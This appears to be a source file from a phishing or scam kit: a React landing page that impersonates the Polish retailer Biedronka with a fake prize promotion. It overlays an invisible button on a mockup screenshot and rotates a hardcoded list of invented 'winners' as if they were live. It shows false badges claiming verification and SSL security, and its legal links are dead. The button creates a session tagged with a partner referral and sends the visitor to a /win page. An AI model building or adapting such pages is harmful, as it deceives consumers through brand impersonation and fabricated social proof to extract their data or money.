"use client";

import { useEffect } from "react";
import { createSessionAction } from "@/app/actions/create-session";

// Biedronka landing - GPT mockup gorseli + gorunmez CTA + canli kazanan + legal.
// Tum metinler Lehcе. CTA tiklaninca session olusur -> /win?session=...
const LANDING_CSS = `
.bd-landing{background:#fff;font-family:HelveticaNeue,Helvetica,Arial,sans-serif;color:#1b1b1b;scrollbar-width:none}
.bd-landing::-webkit-scrollbar{display:none;width:0;height:0}
.bd-landing,.bd-landing *{margin:0;padding:0;box-sizing:border-box}
.bd-landing .wrap{position:relative;max-width:640px;margin:0 auto}
.bd-landing .shot{display:block;width:100%;height:auto;user-select:none;-webkit-user-drag:none}
.bd-landing .cta-hot{position:absolute;left:6%;right:6%;top:86%;bottom:5%;background:transparent;border:none;cursor:pointer;border-radius:999px}
.bd-landing .cta-hot:active{box-shadow:inset 0 4px 14px rgba(0,0,0,.35)}
.bd-landing .page{display:flex;flex-direction:column;min-height:100dvh}
.bd-landing .after{background:linear-gradient(180deg,#ffe9e4 0%,#fff 130px);padding-bottom:1px}
.bd-landing .wsect{max-width:560px;margin:0 auto;padding:14px 16px 6px}
.bd-landing .winners{background:linear-gradient(180deg,#fff,#fafafa);border:1px solid #f0e0e0;border-radius:16px;padding:14px 16px;box-shadow:0 8px 24px rgba(200,20,10,.08)}
.bd-landing .winners .wt{font-weight:800;font-size:12.5px;margin-bottom:7px;text-align:center;letter-spacing:.4px}
.bd-landing .wrow{display:flex;align-items:center;gap:10px;font-size:14px;padding:3px 0}
.bd-landing .dot{width:9px;height:9px;border-radius:50%;background:#2ecc71;flex:none;box-shadow:0 0 0 4px rgba(46,204,113,.18);animation:pulse 1.6s infinite}
.bd-landing .wrow b{color:#e3000f}
@keyframes pulse{50%{box-shadow:0 0 0 7px rgba(46,204,113,.05)}}
.bd-landing .legal{background:#1b1b1b;color:#b9b9b9;padding:28px 20px 24px;font-size:12px;line-height:1.7;margin-top:14px;flex:1}
.bd-landing .legal-in{max-width:560px;margin:0 auto}
.bd-landing .legal .badges{display:flex;flex-wrap:wrap;gap:10px;margin-bottom:16px}
.bd-landing .legal .badges span{background:#2a2a2a;border:1px solid #3a3a3a;border-radius:8px;padding:8px 14px;font-size:12px;color:#e6e6e6;font-weight:600}
.bd-landing .legal h3{color:#fff;font-size:13px;margin:12px 0 5px}
.bd-landing .legal .links{display:flex;gap:18px;flex-wrap:wrap;margin-bottom:12px}
.bd-landing .legal .links a{color:#e6e6e6;text-decoration:underline}
.bd-landing .copy{margin-top:16px;padding-top:12px;border-top:1px solid #333;color:#777}
`;

const LANDING_HTML = `<div class="page"><div class="wrap">
  <img class="shot" src="/landing/biedronka-shot.webp" alt="Biedronka - Poznaj nagrody w naszej akcji" />
  <button type="button" class="cta-hot" onclick="goForm()" aria-label="Dowiedz si\u0119 wi\u0119cej"></button>
</div>
<div class="after">
  <div class="wsect">
    <div class="winners">
      <div class="wt">OSTATNI ZWYCI\u0118ZCY</div>
      <div id="winners"></div>
    </div>
  </div>
</div>
<footer class="legal">
  <div class="legal-in">
    <div class="badges">
      <span>Szyfrowane po\u0142\u0105czenie SSL</span>
      <span>Zweryfikowana akcja promocyjna</span>
      <span>18+ Tylko dla pe\u0142noletnich</span>
      <span>Prawdziwi zwyci\u0119zcy codziennie</span>
    </div>
    <div class="links">
      <a href="#" onclick="return false">Regulamin</a>
      <a href="#" onclick="return false">Polityka prywatno\u015bci</a>
      <a href="#" onclick="return false">Kontakt</a>
    </div>
    <h3>Regulamin</h3>
    Udzia\u0142 w akcji jest bezp\u0142atny i dost\u0119pny od 18. roku \u017cycia. Jedna osoba mo\u017ce wzi\u0105\u0107 udzia\u0142 tylko raz. Nagrody pieni\u0119\u017cne wyp\u0142acane s\u0105 po pomy\u015blnej weryfikacji. Decyzje organizatora s\u0105 ostateczne.
    <h3>Ochrona danych</h3>
    Twoje dane s\u0105 przetwarzane wy\u0142\u0105cznie w celu przeprowadzenia akcji promocyjnej i nie s\u0105 przekazywane osobom trzecim. Wszystkie dane przesy\u0142ane s\u0105 szyfrowanym po\u0142\u0105czeniem SSL.
    <h3>Bezpiecze\u0144stwo</h3>
    Ta strona korzysta z szyfrowanego po\u0142\u0105czenia. Nigdy nie podawaj hase\u0142 ani danych karty. Zwyci\u0119zcy s\u0105 powiadamiani w oficjalny spos\u00f3b.
    <div class="copy">&copy; 2026 Biedronka &middot; Akcja promocyjna &middot; Wszelkie prawa zastrze\u017cone</div>
  </div>
</footer></div>`;

// [isim, sehir (celownikli, "z ..."), fil (wygra\u0142/wygra\u0142a), tutar]
const WINNERS = [
  ["Marek K.", "z Warszawy", "wygra\u0142", "500 z\u0142"],
  ["Anna S.", "z Krakowa", "wygra\u0142a", "1 500 z\u0142"],
  ["Tomasz B.", "z Gda\u0144ska", "wygra\u0142", "1 000 z\u0142"],
  ["Julia K.", "z Wroc\u0142awia", "wygra\u0142a", "2 500 z\u0142"],
  ["Piotr M.", "z Poznania", "wygra\u0142", "500 z\u0142"],
  ["Kasia P.", "z \u0141odzi", "wygra\u0142a", "2 000 z\u0142"],
  ["Dawid R.", "z Katowic", "wygra\u0142", "1 500 z\u0142"],
  ["Sara T.", "z Lublina", "wygra\u0142a", "1 000 z\u0142"],
  ["Micha\u0142 W.", "ze Szczecina", "wygra\u0142", "3 000 z\u0142"],
  ["Ewa Z.", "z Bia\u0142egostoku", "wygra\u0142a", "500 z\u0142"],
];

export default function LandingShell() {
  useEffect(() => {
    const body = document.body;
    const de = document.documentElement;
    body.classList.add("landing-mode");
    try {
      de.style.setProperty("--custom-bg", "none", "important");
      de.style.setProperty("background-image", "none", "important");
      de.style.setProperty("background-color", "#ffffff", "important");
      body.style.setProperty("background-image", "none", "important");
      body.style.setProperty("background", "#ffffff", "important");
      body.style.setProperty("background-color", "#ffffff", "important");
    } catch {}

    (window as unknown as { goForm?: () => Promise<void> }).goForm = async () => {
      const s = new URLSearchParams(window.location.search);
      const existing = s.get("session");
      try {
        if (existing) {
          window.location.href = "/win?session=" + encodeURIComponent(existing);
          return;
        }
        const partner = s.get("ref") || "admin";
        const result = await createSessionAction(partner);
        if (result.success && result.data?.id) {
          const route =
            result.data.public_id != null && String(result.data.public_id).trim() !== ""
              ? String(result.data.public_id)
              : result.data.id;
          window.location.href = "/win?session=" + encodeURIComponent(route);
        }
      } catch {}
    };

    const box = document.getElementById("winners");
    let wi = 0;
    const rot = () => {
      if (!box) return;
      const w = WINNERS[wi % WINNERS.length];
      wi++;
      box.innerHTML =
        '<div class="wrow"><span class="dot"></span><span><b>' + w[0] +
        "</b> " + w[1] + " w\u0142a\u015bnie " + w[2] + " <b>" + w[3] + "</b>!</span></div>";
    };
    rot();
    const iv = window.setInterval(rot, 3500);

    return () => {
      window.clearInterval(iv);
      body.classList.remove("landing-mode");
      try {
        de.style.removeProperty("--custom-bg");
        de.style.removeProperty("background-image");
        de.style.removeProperty("background-color");
        body.style.removeProperty("background-image");
        body.style.removeProperty("background");
        body.style.removeProperty("background-color");
      } catch {}
    };
  }, []);

  return (
    <div
      className="bd-landing fixed inset-0 z-10 overflow-y-auto"
      style={{ backgroundColor: "#ffffff" }}
    >
      <style>{LANDING_CSS}</style>
      <div dangerouslySetInnerHTML={{ __html: LANDING_HTML }} />
    </div>
  );
}
